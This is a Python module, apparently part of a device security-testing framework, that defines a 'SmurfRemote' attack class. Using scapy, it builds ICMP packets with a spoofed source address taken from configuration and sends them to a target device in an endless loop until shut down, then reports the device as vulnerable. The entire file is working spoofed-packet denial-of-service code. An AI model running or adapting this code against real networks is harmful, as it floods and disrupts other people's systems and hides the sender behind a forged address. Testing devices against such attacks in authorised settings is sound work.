
from generic_attack import *
import logging
log = logging.getLogger(__name__)
from scapy.all import *

class SmurfRemote(GenericAttack):

    def __init__(self, attackName, attackConfig, deviceConfig):
        super(SmurfRemote, self).__init__(attackName, attackConfig, deviceConfig)

    def initialize(self, result):

        self.running = True
        target = self.device['ip']

        server_ip = self.config['server_ip']

        ip_hdr = IP(src=server_ip, dst=target)
        icmpPacket = ip_hdr / ICMP()

        while self.running:
            send(icmpPacket)
            time.sleep(0.2)

        return result.update({"status": "vulnerable"})


    def shutdown(self):
        self.running = False


